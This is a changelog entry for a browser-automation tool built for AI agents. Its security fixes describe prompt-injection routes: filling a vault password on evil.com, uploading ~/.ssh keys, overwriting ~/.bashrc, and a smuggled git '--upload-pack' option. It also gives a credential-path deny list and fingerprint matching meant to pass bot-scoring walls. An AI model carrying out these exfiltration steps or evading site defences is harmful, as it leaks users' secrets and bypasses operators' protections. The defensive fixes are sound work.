@@ -4,6 +4,172 @@ All notable changes to vibatchium are documented here. Versions follow
 [Semantic Versioning](https://semver.org/spec/v2.0.0.html). Until 1.0,
 minor bumps may include breaking changes; we'll always call them out here.
 
+## [0.19.4] — 2026-10-05
+
+Two months of ecosystem drift, read against our own code. Two security gaps
+that rivals had closed (credentials filled into any origin, caller paths
+trusted), a fetch lane whose fingerprint contradicted its own User-Agent, and a
+skill that only existed on machines that had already installed us.
+
+### fix(secrets): `fill --use-secret` only writes into the secret's own site
+
+`fill --use-secret github.com:password` resolved the vault value and wrote it
+into whatever element was targeted, on whatever page was open. A
+prompt-injected agent didn't need to read the vault — it could `go evil.com`,
+`fill @e3 --use-secret github.com:password`, and read the field back.
+agent-browser shipped the same fix in v0.38.0 (#1771) and v0.38.2 (#2014).
+
+The value is now written only into a document whose origin belongs to the site:
+https, and the site's host or a subdomain of it — `github.com` allows
+`gist.github.com`, never `github.com.evil.com` or `evilgithub.com`. Origin means
+the frame that **owns the field**, read from the browser's own frame URL, so an
+iframe can't borrow the top page's origin and page script can't spoof it. A site
+whose login lives elsewhere declares it once:
+`vb secret set github.com origins "https://github.com,https://gist.github.com"`.
+Loopback may be plain http, for dev and tests. `site:totp` is bound the same way,
+and the check runs **before** anything is resolved — a refused fill never computes
+the code.
+
+The write goes through a handle pinned to the node that was checked. Afterwards
+that node must still be the one the target resolves to, still attached, in a
+same-origin document, with focus not moved into a foreign iframe. Otherwise the
+field is cleared and the call fails. That replaces 0.18.6's "re-mask whatever the
+locator resolves to now": a node swapped mid-fill is now a refusal, not something
+to cover up.
+
+The escape hatch is operator-only: `vb fill … --allow-cross-origin`, or
+`VIBATCHIUM_SECRET_ALLOW_CROSS_ORIGIN=1` on the daemon. It is **not** in the MCP
+schema, and leaving it out isn't enough on its own — `call_tool` forwards the
+arguments dict verbatim — so MCP (and a `--caps`-restricted REST shim) refuses
+`allow_cross_origin` outright. It also refuses `secret_set … origins`, which
+would otherwise let the same agent add its own host to the list.
+
+Also: the session-default safety mode was read from two env vars. New sessions
+used `VIBATCHIUM_DEFAULT_SAFETY`; the fallback read `VIBATCHIUM_SAFETY_MODE`,
+which a code comment told you to set and which never reached a new session.
+There is now one reader. `VIBATCHIUM_DEFAULT_SAFETY` is the name;
+`VIBATCHIUM_SAFETY_MODE` still works as an alias.
+
+### fix(security): caller-supplied paths can no longer reach your keys, your vault, or your shell rc
+
+Every verb that took a path from the caller trusted it. That caller is often an
+agent reading attacker-controlled page text, so a prompt-injected
+`upload ~/.ssh/id_ed25519` into a web form was exfiltration, and
+`pdf --path ~/.bashrc` was code execution on the next login shell.
+
+Now one module, `vibatchium/fspolicy.py`, judges every caller path **in the
+daemon** — so the CLI, MCP, REST and the SDK all get it — after `~` expansion
+and **symlink resolution**. Both the lexical path and its realpath have to clear
+the policy, so neither a `/tmp` symlink into `~/.ssh` nor a `~/.ssh` that is
+itself a symlink elsewhere slips through. For writes the target needn't exist:
+the existing prefix is resolved, and a dangling final symlink is followed to
+where it *would* write. Writes then go to the resolved path.
+
+- **Always refused:** `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.config/gcloud`,
+  `~/.kube`, `~/.docker/config.json`, `~/.netrc`, `~/.pgpass`,
+  `~/.git-credentials`, `~/.config/gh`, `~/.config/vibatchium` (vault key,
+  vault, profiles), real-browser profiles, keyrings, `/proc`, `/sys`, `/dev`,
+  `/etc/shadow`, `/etc/sudoers*`. Writes are also refused for shell rc files,
+  autostart and systemd user units, `~/.local/bin`, agent configs (`~/.claude`,
+  …), cron spools and system dirs. Not overridable.
+- **Opt-in strict mode:** `VIBATCHIUM_FILE_ROOTS` (`os.pathsep`-separated, set
+  in the daemon's env) confines every caller path to those roots. The deny list
+  still wins inside a root.
+
+Covered: `upload`, `pdf`, `screenshot --path`/`--tile-dir`,
+`screenshot --annotate`, `download save`, `record stop`, `har start`/`stop`,
+`network dump`, `console dump`, `storage export`/`restore`, `proxy set --path`,
+`skill import`, and `start --profile <dir>` (pointing a session at
+`~/.config/google-chrome` would have handed the agent your real logins).
+vibatchium's own default outputs (screenshots cache, explore output,
+checkpoints) aren't caller paths and are never checked; ordinary paths behave
+exactly as before.
+
+Also: `skill import` now skips notes that are symlinked out of the import
+source (a cloned repo could carry `x.md -> ~/.ssh/…`), and its `git clone`
+passes `--` so a `git+--upload-pack=…` source is a bad URL, not a git option.
+
+### fetch: the TLS lane now says what the browser says — or says that it can't
+
+curl_cffi 0.15's newest Chrome preset was chrome146, three majors behind the
+Chrome 153 this box actually runs. The floor is now `curl_cffi>=0.16.3`, which
+adds chrome150, and `_CHROME_TARGETS` picks it up. A test pins that table to
+the installed build's `BrowserType` enum in both directions, so the next bump
+can't leave its newest preset unused.
+
+Measuring that turned up a worse mismatch than the version gap. curl_cffi's
+presets stamp their **own** client hints even when the User-Agent is
+overridden, so a fetch from a Linux Chrome 153 session went out as
+`User-Agent: …Linux…Chrome/153` alongside `sec-ch-ua: …v="150"` and
+`sec-ch-ua-platform: "macOS"`. Same cookies, platform flipping between the
+browser's requests and fetch's. With a live session, fetch now sends the page's
+own `Sec-CH-UA` / `-Mobile` / `-Platform`, read from `navigator.userAgentData`
+in the same evaluate as the UA. curl replaces the preset's headers in place, so
+Chrome's header order holds.
+
+What no free preset can fix gets reported instead. Chrome 152 added a TLS
+`trust_anchors` extension; curl_cffi 0.16.3 ships no chrome152 preset.
+Responses now carry a non-breaking `tls_coherence: {ua_major, impersonate, gap,
+note, client_hints}` when the session's Chrome is more than one major ahead of
+the newest preset, or is 152+, and the daemon logs it once per (version,
+preset). On a JA3/JA4-scoring wall, that field means: use `go`.
+
+### fix(goals): the nav guard no longer outlives the goal
+
+A goal's domain allowlist is enforced by a `context.route("**/*")` guard.
+Releasing the goal cleared the allowlist but left the route installed for the
+session's life — inert, yet still disabling Chrome's HTTP cache and sending
+every request through the driver. Under patchright's per-request
+route-listener leak (Kaliiiiiiiiii-Vinyzu/patchright#245) that is unbounded
+growth on any long-lived session that ever ran a goal. Every release path —
+done, fail, cancel, pause, ask — now unroutes exactly the guard; a user
+`route_add` rule on the same glob survives, and the next goal re-installs.
+
+### feat(dist): `npx skills add trueoriginlabs/vibatchium`, and a Claude Code plugin
+
+The agent skill existed only as a Python string that `vb setup` wrote into
+`~/.claude/skills/`. Nothing in the repo was a skill, so skills.sh — one
+install command, every agent it supports — found nothing, and there was no
+plugin to install. Now there is one file, `skills/vibatchium/SKILL.md`,
+generated from the same template `vb setup` renders. The committed copy is the
+*portable* rendering: it lands on machines that may not have vb yet, so it says
+how to get it instead of naming a binary path that only exists on ours.
+`scripts/sync_skill.py` regenerates it, and a test fails the moment it drifts.
+
+The repo root doubles as a Claude Code plugin marketplace
+(`/plugin marketplace add trueoriginlabs/vibatchium`, then
+`/plugin install vibatchium@vibatchium`): the skill plus `vb mcp` as a stdio
+server. Both routes still need the `vb` CLI on `PATH`.
+
+Two corrections ride along in the skill text, and so in `vb setup` too: it
+still told agents to `go --wait-until commit` on slow pages and that a killed
+client leaks the daemon lock (AGENTS.md had corrected both). The trigger
+description now also fires on what an agent actually sees first: a 403, a
+"Just a moment..." page, an empty JavaScript shell.
+
+### feat(mcp): the five tools that finish the common job stay loaded
+
+Claude Code defers MCP tools behind tool search, and a browser that has to be
+searched for loses to WebFetch, which is always there. `explore`, `go`,
+`extract`, `screenshot` and `act` now carry `_meta["anthropic/alwaysLoad"]`, so
+they load at session start while the other 81 lean tools stay deferred. Other
+clients ignore the key. (The mcp 1.x SDK only sends it when passed as
+`_meta=`; `meta=` is silently kept as an extra field and never reaches the
+wire. A test drives a real stdio handshake to pin that.)
+
+### deps
+
+- **`mcp>=1.27.2` → `>=1.30.0`.** 1.30.0 is the 1.x fix for GHSA-84m7-p3x7-pcfv,
+  GHSA-qx49-fqc8-xw99, GHSA-5h93-6whr-6q8j and GHSA-rwrf-2pqf-9j8j
+  (GHSA-fmmv-w9g8-j3gc landed in 1.29.1). `<2.0` holds.
+- **`curl_cffi>=0.7` → `>=0.16.3`** (above). 0.16 made `rich` optional, so rich,
+  markdown-it-py and mdurl leave the lock.
+- **`uv.lock`: patchright 1.60.0 → 1.61.2.** 0.17.1 vetted 1.61 but left the lock
+  behind, so `uv sync` and `pip install` resolved different minors. Re-vetted on
+  Chrome 153 (drift gate + wave7 posture + bench_offline). The `<1.62` cap
+  stands: the upstream fix for the driver CPU spin (#246) and the route-listener
+  leak (#245) is patchright #247, merged 2026-10-01 and in no release yet.
+
 ## [0.19.3] — 2026-10-05
 
 ### feat(capture): `vb start --scale N` — real 2× screenshots, including of interactive states
